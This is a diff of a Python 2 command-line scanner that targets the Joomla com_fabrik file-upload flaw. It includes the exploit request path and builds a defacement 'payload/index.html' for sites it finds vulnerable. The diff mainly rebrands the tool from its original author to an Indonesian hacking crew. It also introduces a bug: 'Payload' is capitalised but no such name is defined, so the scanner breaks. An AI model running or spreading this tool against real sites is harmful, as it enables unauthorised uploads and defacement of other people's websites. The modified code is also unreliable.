@@ -46,7 +46,7 @@ def scanner():
 			neww.pop()
 			xx = "".join(neww)
 			site = xx
-	darsh = site + payload
+	darsh = site + Payload
 	try:
          try:
 	  try:
@@ -122,7 +122,7 @@ def hlp():
 \t\033[1;31m ========      ===========\033[1;39m
 \t
 \t -h/help       Help
-\t set url       set url <isi target>
+\t lock url      lock url <isi target>
 \t set file      set file <filename.txt>
 \t clear         clear screen
 \t scan          Scanner Com_Fabrik
@@ -134,12 +134,12 @@ def hlp():
  print help
 
 main = ""
-u = "< set url >"
+u = "< lock url >"
 payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
 web = ""
 while True:
 	try:
-	 cod = raw_input("\033[1;39mCoder \033[1;32m>>\033[1;32m ")
+	 cod = raw_input("\033[1;39mr00t#jinxpro.id-> \033[1;32m>>\033[1;32m ")
 	 coder = cod.split()
 	 if not coder:
                 print "<\033[1;31minvalid command\033[1;39m>"
@@ -150,10 +150,10 @@ while True:
 		scanner()
 	 elif coder[0] == "about":
 		print '\033[1;39m'
-		print '\t Name   : Sachin'
-		print '\t Country: India'
-		print '\t Channel: BBSAD'
-		print '\t Link   : https://youtu.be/87GMKQq_nTs'
+		print '\t Name   : Jinxpro.id'
+		print '\t Country: Indonesia'
+		print '\t MyTeam.: JakartaHunterCrew'
+		print '\t Link FB: https://www.facebook.com/FikriNetral7'
 		print '\t'
 
 	 elif coder[0] == "-h":
@@ -218,18 +218,18 @@ while True:
 		print check2
 
 		if check2 != vu:
-			print "\033[1;31m[-] Site is not vulnerable\033[1;39m"
+			print "\033[1;31m[-] Website tidak vuln. Cari lagi sana\033[1;39m"
 			print ''
 		else:
-			print "[+] Site is vulnerable"
-			sachin = "payload/index.html"
+			print "[+] Website vuln. Hajaar !"
+			jinxpro = "payload/index.html"
 
-			if os.path.exists(sachin):
-				os.remove(sachin)
+			if os.path.exists(jinxpro):
+				os.remove(jinxpro)
 
 			expl = open("payload/index.html" , "w")
 			expl.write("<html><head> \n")
-			expl.write("<title>Joomla Exploit</title> \n")
+			expl.write("<title>Indonesia Exploiter's</title> \n")
 			expl.write('</head><body background=""> \n')
 			expl.write('<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amaranth"> \n')
 			expl.write('<style> \n')
@@ -257,7 +257,7 @@ while True:
 			print ''
 			print boothappa
 			print ''
-			print "\033[1;32mPayload generated in [ payload/index.html ] Happy hacking ...\033[1;39m"
+			print "\033[1;32mPayload generated in [ payload/index.html ] Enjoy...\033[1;39m"
 			print ''
 
 	 elif coder[0] == "show":
